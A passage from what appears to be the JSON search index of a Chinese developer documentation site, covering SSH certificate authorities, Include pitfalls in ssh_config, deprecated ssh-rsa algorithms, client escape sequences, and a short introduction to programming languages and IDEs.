\u200b\u7684\u200b\u516c\u94a5\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u516c\u94a5\u524d\u200b\u6dfb\u52a0\u200b\u9009\u9879\u200b <code>@cert-authority *</code>\uff0c\u200b\u4f8b\u5982\u200b\uff1b</p> ~/.ssh/known_hosts<pre><code>@cert-authority * ssh-ed25519 AAAAC3N... My CA\n</code></pre> <p>\u200b\u5bf9\u4e8e\u200b\u5b9e\u9a8c\u5ba4\u200b\u7b49\u200b\u516c\u7528\u200b\u673a\u5668\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5c06\u200b CA \u200b\u6761\u76ee\u200b\u914d\u7f6e\u200b\u5728\u200b <code>/etc/ssh/ssh_known_hosts</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u5176\u4f1a\u200b\u5bf9\u200b\u6240\u6709\u200b\u7528\u6237\u200b\u751f\u6548\u200b\uff0c\u200b\u800c\u200b\u65e0\u9700\u200b\u518d\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u7528\u6237\u200b\u5355\u72ec\u200b\u914d\u7f6e\u200b\u3002</p>"},{"location":"dev/ssh/#client-certificates","title":"\u5ba2\u6237\u7aef\u200b\u8bc1\u4e66","text":"<p>\u200b\u9996\u5148\u200b\u4e3a\u200b\u670d\u52a1\u7aef\u200b\u914d\u7f6e\u200b CA \u200b\u4fe1\u4efb\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u670d\u52a1\u7aef\u200b\u5efa\u7acb\u200b\u4e00\u4e2a\u200b\u201c\u200b\u4fe1\u4efb\u200b CA \u200b\u5217\u8868\u200b\u201d\u200b\u6587\u4ef6\u200b\u3002\u200b\u5176\u200b\u91c7\u7528\u200b\u901a\u5e38\u200b\u7684\u200b <code>authorized_keys</code> \u200b\u683c\u5f0f\u200b\uff0c\u200b\u5373\u200b\u6bcf\u884c\u200b\u4e00\u4e2a\u200b\u516c\u94a5\u200b\u3002\u200b\u6211\u4eec\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u7ea6\u5b9a\u4fd7\u6210\u200b\u3001\u200b\u6613\u4e8e\u200b\u8fa8\u8ba4\u200b\u7684\u200b\u8def\u5f84\u200b <code>/etc/ssh/ssh_user_ca</code>\uff1a</p> /etc/ssh/ssh_user_ca<pre><code>ssh-ed25519 AAAAC3N... My org CA\n</code></pre>"},{"location":"dev/ssh/#misc","title":"\u6742\u9879","text":""},{"location":"dev/ssh/#include","title":"\u62c6\u5206\u200b\u914d\u7f6e\u6587\u4ef6","text":"<p>\u200b\u4ece\u200b OpenSSH 7.3p1 \u200b\u5f00\u59cb\u200b\uff0cssh_config \u200b\u548c\u200b sshd_config \u200b\u90fd\u200b\u652f\u6301\u200b <code>Include</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e3b\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b include \u200b\u5176\u4ed6\u200b\u6587\u4ef6\u200b\u3002\u200b\u4e0e\u200b C \u200b\u7684\u200b <code>#include</code> \u200b\u6216\u200b Nginx \u200b\u7684\u200b <code>include</code> \u200b\u4e0d\u540c\u200b\uff0cSSH config \u200b\u91cc\u200b\u7684\u200b <code>Include</code> \u200b\u4e0d\u7b49\u4ef7\u200b\u4e8e\u200b\u6587\u672c\u200b\u63d2\u5165\u200b\u66ff\u6362\u200b\uff0c\u200b\u5e76\u4e14\u200b <code>Include</code> \u200b\u53ef\u4ee5\u200b\u51fa\u73b0\u200b\u5728\u200b <code>Host</code> \u200b\u548c\u200b <code>Match</code> \u200b\u5757\u200b\u4e2d\u200b\uff0c\u200b\u51fa\u73b0\u200b\u5728\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5757\u200b\u4e2d\u200b\u7684\u200b <code>Include</code> \u200b\u4f1a\u200b\u88ab\u200b\u89c6\u4f5c\u200b\u6761\u4ef6\u200b\u5305\u542b\u200b\u3002\u200b\u56e0\u6b64\u200b\u4e00\u4e2a\u200b\uff08\u200b\u4e0d\u592a\u200b\u5e38\u89c1\u200b\u7684\u200b\uff09\u200b\u5751\u200b\u662f\u200b\uff1a</p> \u200b\u9519\u8bef\u200b\u5199\u6cd5\u200b <pre><code>Host example\n  HostName example.com\n  User user\n\nInclude ~/.ssh/global.conf\n</code></pre> <p>\u200b\u56e0\u4e3a\u200b SSH \u200b\u8bfb\u53d6\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u65f6\u200b\u662f\u200b\u4e0d\u4f1a\u200b\u770b\u200b\u7f29\u8fdb\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0a\u9762\u200b\u793a\u4f8b\u200b\u4e2d\u200b\u7684\u200b Include \u200b\u4ec5\u200b\u5bf9\u200b <code>Host example</code> \u200b\u751f\u6548\u200b\u3002\u200b\u6b63\u786e\u200b\u7684\u200b\u5199\u6cd5\u200b\u662f\u200b\u5c06\u200b\u5176\u200b\u653e\u5728\u200b\u4e00\u4e2a\u200b <code>Match all</code> \u200b\u5757\u200b\uff08\u200b\u6216\u8005\u200b <code>Host *</code>\uff09\u200b\u4e2d\u200b\uff1a</p> \u200b\u6b63\u786e\u200b\u5199\u6cd5\u200b <pre><code>Host example\n  HostName example.com\n  User user\n\nMatch all\n  Include ~/.ssh/global.conf\n</code></pre> <p>\u200b\u66f4\u52a0\u200b\u63a8\u8350\u200b\u7684\u200b\u5199\u6cd5\u200b\u662f\u200b\u5c06\u200b <code>Include</code> \u200b\u653e\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5f00\u5934\u200b\uff1a</p> <p>\u200b\u63a8\u8350\u200b\u5199\u6cd5\u200b</p> <pre><code>Include ~/.ssh/global.conf\n\nHost example\n  HostName example.com\n  User user\n</code></pre>"},{"location":"dev/ssh/#traps","title":"\u4e00\u4e9b\u200b\u5751\u70b9","text":"<p>\u200b\u5728\u200b OpenSSH \u200b\u5185\u90e8\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u201c\u200b\u4ee3\u53f7\u200b\u201d\u200b\u53ef\u80fd\u200b\u6307\u4ee3\u200b\u591a\u79cd\u200b\uff08\u200b\u6709\u200b\u5173\u8054\u200b\u4f46\u200b\uff09\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ec6\u8282\u200b\u3002\u200b\u4f8b\u5982\u200b <code>ssh-rsa</code> \u200b\u81f3\u5c11\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u4e09\u79cd\u200b\u4e0d\u540c\u200b\u7684\u200b\u542b\u4e49\u200b\uff1a</p> <ul> <li>RSA \u200b\u5bc6\u94a5\u200b\u5bf9\u200b\u6216\u200b RSA \u200b\u516c\u94a5\u200b\u7b97\u6cd5\u200b\uff08<code>id_rsa</code> \u200b\u548c\u200b <code>id_rsa.pub</code> \u200b\u6587\u4ef6\u200b\uff09</li> <li>\u200b\u57fa\u4e8e\u200b RSA / SHA-1 \u200b\u7684\u200b SSH \u200b\u8bc1\u4e66\u200b\u7684\u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\uff08<code>CASignatureAlgorithms</code>\uff09</li> </ul> <p>\u200b\u8fd9\u79cd\u200b\u7b97\u6cd5\u200b\u5df2\u7ecf\u200b\u5728\u200b OpenSSH 8.2 \u200b\u4e2d\u200b\u88ab\u200b\u6dd8\u6c70\u200b\uff0c\u200b\u800c\u200b OpenSSH 7.2 \u200b\u8d77\u200b\u5c31\u200b\u5df2\u7ecf\u200b\u652f\u6301\u200b\u66ff\u4ee3\u200b\u7b97\u6cd5\u200b <code>rsa-sha2-256</code> \u200b\u548c\u200b <code>rsa-sha2-512</code>\uff08\u200b\u91c7\u7528\u200b SHA-256 \u200b\u548c\u200b SHA-512 \u200b\u54c8\u5e0c\u200b\u7b97\u6cd5\u200b\uff09\uff0c\u200b\u867d\u7136\u200b\u76f4\u5230\u200b OpenSSH 8.2\uff0c\u200b\u4f7f\u7528\u200b RSA CA \u200b\u79c1\u94a5\u200b\u7b7e\u200b\u51fa\u6765\u200b\u7684\u200b\u8bc1\u4e66\u200b\u624d\u200b\u9ed8\u8ba4\u200b\u91c7\u7528\u200b <code>rsa-sha2-512</code> \u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b RSA CA\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u9700\u8981\u200b\u5c06\u200b\u5df2\u6709\u200b\u7684\u200b\u8bc1\u4e66\u200b\u4f7f\u7528\u200b OpenSSH 8.2 \u200b\u4ee5\u4e0a\u200b\u7684\u200b\u7248\u672c\u200b\u91cd\u65b0\u200b\u7b7e\u540d\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4e34\u65f6\u200b\u517c\u5bb9\u200b \u2264 7.1 \u200b\u7248\u672c\u200b\u7684\u200b OpenSSH\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>~/.ssh/config</code> \u200b\u6216\u200b <code>sshd_config</code> \u200b\u4e2d\u200b\u6307\u5b9a\u200b <code>CASignatureAlgorithms +ssh-rsa</code>\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u65e7\u7248\u672c\u200b\u7684\u200b\u8bc1\u4e66\u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\u4e86\u200b\u3002</p> <ul> <li>\u200b\u57fa\u4e8e\u200b RSA / SHA-1 \u200b\u7684\u200b\u516c\u94a5\u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\u5957\u4ef6\u200b\uff08<code>ssh-rsa</code>\uff09\u3002\u200b\u4e0e\u200b\u524d\u9762\u200b\u7684\u200b\u8bc1\u4e66\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\u662f\u200b\u7528\u4e8e\u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u65f6\u200b\u7684\u200b\u516c\u94a5\u200b\u9a8c\u8bc1\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u4fdd\u5b58\u200b\u5728\u200b\u6587\u4ef6\u200b\u91cc\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b SSH \u200b\u534f\u8bae\u200b\u5185\u90e8\u200b\u4f7f\u7528\u200b\u3002</li> </ul> <p>\u200b\u4e0e\u200b\u524d\u200b\u4e00\u4e2a\u200b\u91c7\u7528\u200b SHA-1 \u200b\u4f5c\u4e3a\u200b\u54c8\u5e0c\u200b\u7b97\u6cd5\u200b\u7684\u200b\u7b97\u6cd5\u200b\u5957\u4ef6\u200b\u7c7b\u4f3c\u200b\uff0cOpenSSH 8.8 \u200b\u8d77\u200b\u4e5f\u200b\u4e0d\u518d\u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b\uff0c\u200b\u4e14\u200b\u66ff\u4ee3\u200b\u7b97\u6cd5\u200b\u4e5f\u200b\u5206\u522b\u200b\u53eb\u505a\u200b <code>rsa-sha2-256</code> \u200b\u548c\u200b <code>rsa-sha2-512</code>\u3002\u200b\u597d\u6d88\u606f\u200b\u662f\u200b\uff0c\u200b\u4f60\u200b\u4e0d\u200b\u9700\u8981\u200b\u91cd\u65b0\u200b\u7b7e\u53d1\u200b\u4efb\u4f55\u200b\u8bc1\u4e66\u200b\uff0c\u200b\u53ea\u8981\u200b\u786e\u4fdd\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u7aef\u200b\u7684\u200b OpenSSH \u200b\u7248\u672c\u200b\u90fd\u200b\u4e0d\u200b\u4f4e\u4e8e\u200b 7.2 \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4e34\u65f6\u200b\u517c\u5bb9\u200b \u2264 7.1 \u200b\u7248\u672c\u200b\u7684\u200b OpenSSH\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u914d\u7f6e\u200b\u9009\u9879\u200b <code>HostkeyAlgorithms</code> \u200b\u548c\u200b <code>PubkeyAcceptedAlgorithms</code> \u200b\u542f\u7528\u200b\u3002\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u9009\u9879\u200b\u5206\u522b\u200b\u63a7\u5236\u200b\u670d\u52a1\u7aef\u200b\u548c\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u516c\u94a5\u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\u5957\u4ef6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u4e24\u7aef\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u3002</p>"},{"location":"dev/ssh/#escape-sequences","title":"SSH \u200b\u8f6c\u4e49\u5e8f\u5217","text":"<p>SSH \u200b\u8fde\u63a5\u200b\u7531\u200b\u672c\u5730\u200b\u7684\u200b ssh \u200b\u5ba2\u6237\u7aef\u200b\u53d1\u8d77\u200b\uff0c\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b\u540e\u200b\uff0c\u200b\u4f60\u200b\u5728\u200b\u7ec8\u7aef\u200b\u8f93\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u9ed8\u8ba4\u200b\u90fd\u200b\u4f1a\u200b\u53d1\u9001\u5230\u200b\u8fdc\u7aef\u200b\u670d\u52a1\u5668\u200b\u3002\u200b\u4f46\u200b\u6709\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8ba9\u200b\u672c\u5730\u200b ssh \u200b\u5ba2\u6237\u7aef\u200b\u7acb\u5373\u200b\u54cd\u5e94\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6bd4\u5982\u200b\u65ad\u5f00\u8fde\u63a5\u200b\u3001\u200b\u6302\u200b\u8d77\u4f1a\u8bdd\u200b\u3001\u200b\u914d\u7f6e\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u7b49\u200b\uff0c\u200b\u8fd9\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7528\u200b\u201c\u200b\u8f6c\u4e49\u5e8f\u5217\u200b\u201d\u200b\u6765\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u8f6c\u4e49\u5e8f\u5217\u200b\u7684\u200b\u7528\u6cd5\u200b\u662f\u200b\uff1a\u200b\u5728\u200b\u65b0\u200b\u7684\u200b\u4e00\u884c\u200b\u5148\u200b\u6309\u200b\u56de\u8f66\u200b\uff0c\u200b\u7136\u540e\u200b\u8f93\u5165\u200b <code>~</code>\uff0c\u200b\u540e\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u672c\u5730\u200b ssh \u200b\u5ba2\u6237\u7aef\u200b\u8bc6\u522b\u200b\u4e3a\u200b\u547d\u4ee4\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u53d1\u7ed9\u200b\u8fdc\u7aef\u200b\u670d\u52a1\u5668\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u5c55\u793a\u200b\u7684\u200b\u8f6c\u4e49\u5e8f\u5217\u200b\u5747\u200b\u4ee5\u200b <code>~</code> \u200b\u5f00\u5934\u200b\u8868\u793a\u200b\u3002</p> <p>\u200b\u5e38\u7528\u200b\u7684\u200b SSH \u200b\u8f6c\u4e49\u5e8f\u5217\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li><code>~.</code>\uff1a\u200b\u7acb\u523b\u200b\u65ad\u5f00\u200b\u5f53\u524d\u200b SSH \u200b\u8fde\u63a5\u200b\u3002\u200b\u5728\u200b\u547d\u4ee4\u884c\u200b\u8f93\u5165\u200b\u56de\u8f66\u200b\u540e\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8f93\u5165\u200b <code>~.</code>\uff0c\u200b\u65e0\u9700\u200b\u7b49\u5f85\u200b\u8fdc\u7aef\u200b\u54cd\u5e94\u200b\uff0c\u200b\u9002\u7528\u200b\u4e8e\u200b\u8fdc\u7aef\u200b\u5361\u6b7b\u200b\u6216\u200b\u7f51\u7edc\u200b\u5f02\u5e38\u200b\u65f6\u200b\u5f3a\u5236\u200b\u65ad\u5f00\u200b\u3002</li> <li><code>~^Z</code>\uff1a\u200b\u6302\u200b\u8d77\u200b SSH \u200b\u5ba2\u6237\u7aef\u200b\uff08\u200b\u53d1\u9001\u200b SIGTSTP\uff09\uff0c\u200b\u56de\u5230\u200b\u672c\u5730\u200b shell\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>fg</code> \u200b\u6062\u590d\u200b SSH \u200b\u4f1a\u8bdd\u200b\u3002\u200b\u56de\u8f66\u200b\u540e\u200b\u8f93\u5165\u200b <code>~</code>\uff0c\u200b\u518d\u200b\u6309\u200b\u4e0b\u200b <code>Ctrl+Z</code>\u3002</li> <li> <p><code>~C</code>\uff1a\u200b\u6253\u5f00\u200b SSH \u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>-L</code> <code>-R</code> <code>-D</code> \u200b\u53c2\u6570\u200b\u914d\u7f6e\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3002<code>-KL</code> <code>-KR</code> <code>-KD</code> \u200b\u53c2\u6570\u200b\u5173\u95ed\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3002</p> <p>Warning</p> <p>OpenSSH 9.2 \u200b\u65b0\u589e\u200b\u4e86\u200b <code>EnableEscapeCommandline</code> \u200b\u8bbe\u7f6e\u200b\u9879\u200b\uff0c\u200b\u4e14\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b no\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>~C</code> \u200b\u547d\u4ee4\u884c\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u542f\u7528\u200b\u8be5\u200b\u8bbe\u7f6e\u200b\u9879\u200b\u3002OpenSSH \u2264 9.1 \u200b\u7684\u200b\u7248\u672c\u200b\u9ed8\u8ba4\u200b\u5141\u8bb8\u200b <code>~C</code>\u3002</p> </li> <li> <p><code>~#</code>\uff1a\u200b\u5217\u51fa\u200b\u5f53\u524d\u200b\u6240\u6709\u200b\u8f6c\u53d1\u200b\u7684\u200b\u8fde\u63a5\u200b\uff08\u200b\u5982\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3001X11 \u200b\u8f6c\u53d1\u200b\u7b49\u200b\uff09\uff0c\u200b\u4fbf\u4e8e\u200b\u6392\u67e5\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u95ee\u9898\u200b\u3002</p> </li> <li><code>~?</code>\uff1a\u200b\u663e\u793a\u200b\u6240\u6709\u200b\u53ef\u7528\u200b\u7684\u200b\u8f6c\u4e49\u5e8f\u5217\u200b\u53ca\u5176\u200b\u8bf4\u660e\u200b\uff0c\u200b\u9047\u5230\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u60c5\u51b5\u200b\u53ef\u4ee5\u200b\u5148\u200b\u7528\u200b\u8fd9\u4e2a\u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u5e2e\u52a9\u200b\u3002</li> </ul> <p>\u200b\u5982\u679c\u200b\u5f00\u542f\u200b\u4e86\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\u529f\u80fd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u90e8\u5206\u200b\u8f6c\u4e49\u5e8f\u5217\u200b\u65e0\u6cd5\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>~^Z</code> \u200b\u548c\u200b <code>~C</code> \u200b\u7b49\u200b\u3002</p> <p>\u200b\u6ce8\u610f\u4e8b\u9879\u200b</p> <ul> <li>\u200b\u8f6c\u4e49\u5e8f\u5217\u200b\u5fc5\u987b\u200b\u5728\u200b\u6309\u200b\u4e0b\u200b\u56de\u8f66\u200b\u540e\u200b\u7acb\u5373\u200b\u8f93\u5165\u200b\uff08\u200b\u5373\u200b\u5f53\u524d\u200b\u884c\u200b\u524d\u9762\u200b\u4e0d\u80fd\u200b\u6709\u200b\u5176\u4ed6\u200b\u5b57\u7b26\u200b\uff09\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u88ab\u200b\u5f53\u4f5c\u200b\u666e\u901a\u200b\u8f93\u5165\u200b\u4f20\u7ed9\u200b\u8fdc\u7aef\u200b\u3002</li> <li>\u200b\u5728\u200b\u591a\u5c42\u200b SSH \u200b\u8df3\u677f\u200b\uff08\u200b\u591a\u6b21\u200b ssh \u200b\u5d4c\u5957\u200b\uff09\u200b\u65f6\u200b\uff0c\u200b\u6bcf\u200b\u591a\u4e00\u5c42\u200b\uff0c\u200b\u9700\u8981\u200b\u8f93\u5165\u200b\u7684\u200b <code>~</code> \u200b\u4f1a\u200b\u7ffb\u500d\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c<code>~~.</code> \u200b\u6307\u4ee4\u200b\u4f1a\u200b\u65ad\u5f00\u200b\u7b2c\u4e8c\u5c42\u200b\u7684\u200b SSH \u200b\u8fde\u63a5\u200b\uff0c\u200b\u800c\u200b <code>~~~~.</code> \u200b\u6307\u4ee4\u200b\u4f1a\u200b\u65ad\u5f00\u200b\u7b2c\u4e09\u5c42\u200b\u7684\u200b SSH \u200b\u8fde\u63a5\u200b\u3002</li> </ul> <ol> <li> <p>\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b OpenBSD \u200b\u7248\u672c\u200b\u7684\u200b <code>nc</code> \u200b\u547d\u4ee4\u200b\uff0c\u200b\u5982\u200b <code>apt install netcat-openbsd</code>\u3002\u00a0\u21a9</p> </li> <li> <p>\u200b\u4e8b\u5b9e\u4e0a\u200b <code>-f</code> \u200b\u53c2\u6570\u200b\u4e5f\u200b\u662f\u200b\u53ef\u9009\u200b\u7684\u200b\uff0c\u200b\u4f46\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b <code>ssh-keygen</code> \u200b\u5c06\u200b\u5176\u200b\u653e\u7f6e\u200b\u5728\u200b <code>~/.ssh</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u4ece\u800c\u200b\u66f4\u200b\u5bb9\u6613\u200b\u4e0e\u200b\u4e2a\u4eba\u200b\u7528\u4e8e\u200b\u767b\u5f55\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u79c1\u94a5\u200b\u6df7\u6dc6\u200b\uff0c\u200b\u6b64\u5904\u200b\u663e\u5f0f\u200b\u6307\u5b9a\u200b\u4e86\u200b\u8f93\u51fa\u200b\u6587\u4ef6\u540d\u200b\u3002\u00a0\u21a9</p> </li> </ol>"},{"location":"dev/language/","title":"\u7f16\u7a0b\u8bed\u8a00\u200b\u4e0e\u200b\u5de5\u5177","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u6211\u4eec\u200b\u5f00\u53d1\u200b\u65f6\u200b\u5e38\u7528\u200b\u7684\u200b\u7f16\u7a0b\u8bed\u8a00\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5e38\u7528\u5de5\u5177\u200b\u3001\u200b\u5b9e\u7528\u6280\u5de7\u200b\u7b49\u200b\u4fe1\u606f\u200b\u3002</p> <p>Note</p> <p>\u200b\u73b0\u4ee3\u200b\u5f00\u53d1\u200b\u8bed\u8a00\u200b\u79cd\u7c7b\u200b\u4e30\u5bcc\u200b\u3001\u200b\u5185\u5bb9\u200b\u7e41\u591a\u200b\uff1b\u200b\u90e8\u5206\u200b\u8bed\u8a00\u200b\u4e5f\u200b\u5b58\u5728\u200b\u4e0d\u5c11\u200b\u7684\u200b\u5386\u53f2\u200b\u9057\u7559\u95ee\u9898\u200b\uff0c\u200b\u6211\u4eec\u200b\u65e0\u6cd5\u200b\u5728\u200b\u4e00\u7bc7\u200b\u6587\u6863\u200b\u4e2d\u200b\u6db5\u76d6\u200b\u5b8c\u5168\u200b\u3002</p> <p>\u200b\u9605\u8bfb\u200b\u672c\u200b\u6587\u6863\u200b\u540e\u200b\uff0c\u200b\u60a8\u200b\u5e94\u5f53\u200b\u80fd\u591f\u200b\u77e5\u6653\u200b\uff1a</p> <ul> <li>\u200b\u8bed\u8a00\u200b\u7684\u200b\u9002\u7528\u8303\u56f4\u200b\uff08\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u4efb\u52a1\u200b\uff0c\u200b\u6211\u200b\u5e94\u8be5\u200b\u9009\u7528\u200b\u54ea\u200b\u79cd\u200b\u8bed\u8a00\u200b\uff09</li> <li>\u200b\u8bed\u8a00\u200b\u7684\u200b\u7279\u70b9\u200b\uff08\u200b\u7279\u6027\u200b\u3001\u200b\u53d1\u5c55\u200b\u5386\u7a0b\u200b\u3001\u200b\u793e\u533a\u200b\u6d3b\u8dc3\u5ea6\u200b\u7b49\u200b\uff09</li> <li>\u200b\u5982\u4f55\u200b\u5b66\u4e60\u200b\u8fd9\u79cd\u200b\u8bed\u8a00\u200b\uff08\u200b\u5165\u95e8\u200b\u6587\u6863\u200b\u94fe\u63a5\u200b\u3001\u200b\u5b66\u4e60\u200b\u8d44\u6e90\u200b\u7b49\u200b\uff09</li> <li>\u200b\u5404\u4e2a\u200b\u8bed\u8a00\u200b\u7684\u200b\u5e38\u7528\u5de5\u5177\u200b\uff08\u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b\u8fd9\u79cd\u200b\u8bed\u8a00\u200b\u8fdb\u884c\u200b\u5f00\u53d1\u200b\uff09</li> </ul> <p>\u200b\u5bf9\u200b\u90e8\u5206\u200b\u7f16\u7a0b\u8bed\u8a00\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u4f1a\u200b\u7ed9\u51fa\u200b\u4e00\u4e9b\u200b\u7f16\u7a0b\u200b\u98ce\u683c\u200b\u6307\u5357\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u60a8\u200b\u66f4\u597d\u200b\u3001\u200b\u66f4\u200b\u89c4\u8303\u200b\u5730\u200b\u4f7f\u7528\u200b\u8fd9\u4e9b\u200b\u8bed\u8a00\u200b\u3002</p> <p>IDE \u200b\u63a8\u8350\u200b</p> <ul> <li>Visual Studio Code: \u200b\u5176\u5b9e\u200b Visual Studio Code \u200b\u662f\u200b\u4e2a\u200b\u4ee3\u7801\u200b\u7f16\u8f91\u5668\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u4f17\u591a\u200b\u63d2\u4ef6\u200b\u7684\u200b\u5e2e\u52a9\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b IDE \u200b\u4e00\u6837\u200b\u7684\u200b\u4f53\u9a8c\u200b\u3002Visual Studio Code \u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u5404\u79cd\u200b\u8bed\u8a00\u200b\u7684\u200b\u5f00\u53d1\u200b\uff0c\u200b\u66f4\u662f\u200b\u62e5\u6709\u200b\u975e\u5e38\u200b\u51fa\u8272\u200b\u7684\u200b\u8fdc\u7a0b\u200b\u5f00\u53d1\u200b\u529f\u80fd\u200b\u3002</li> <li>Pycharm: Jetbrains \u200b\u5f00\u53d1\u200b\u7684\u200b Python IDE\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5f00\u7bb1\u200b\u5373\u7528\u200b\u7684\u200b Python \u200b\u5f00\u53d1\u200b\u4f53\u9a8c\u200b\uff0c\u200b\u652f\u6301\u200b Python \u200b\u7684\u200b\u5404\u79cd\u200b\u6846\u67b6\u200b</li> <li>Clion: Jetbrains \u200b\u5f00\u53d1\u200b\u7684\u200b C++ IDE\uff0c\u200b\u4f7f\u7528\u200b CMake \u200b\u7ba1\u7406\u200b\u5de5\u7a0b\u200b\uff0c\u200b\u62e5\u6709\u200b\u5f3a\u5927\u200b\u7684\u200b\u9759\u6001\u200b\u68c0\u67e5\u200b\u529f\u80fd\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5f3a\u5927\u200b\u7684\u200b\u4ee3\u7801\u200b\u91cd\u6784\u200b\u529f\u80fd\u200b</li> <li>QT Creator: \u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u5f00\u53d1\u200b Qt \u200b\u5e94\u7528\u200b\u7684\u200b IDE</li> <li>Cursor: \u200b\u6df1\u5ea6\u200b\u96c6\u6210\u200b\u4e86\u200b AI \u200b\u5de5\u5177\u200b\u7684\u200b\u4ee3\u7801\u200b\u7f16\u8f91\u5668\u200b\uff0c\u200b\u57fa\u4e8e\u200b Visual Studio Code \u200b\u5f00\u53d1\u200b\uff0c\u200b\u517c\u5bb9\u200b\u5927\u90e8\u5206\u200b Visual Studio Code \u200b\u7684\u200b\u63d2\u4ef6\u200b\uff0cTab \u200b\u952e\u200b\u7684\u200b\u4f53\u9a8c\u200b\u8c01\u200b\u7528\u200b\u8c01\u200b\u77e5\u9053\u200b\uff01</li> </ul>"},{"location":"dev/language/cxx/","title":"C/C++ \u200b\u4e0e\u200b\u6784\u5efa\u200b\u5de5\u5177","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@xiao-h1024</p> 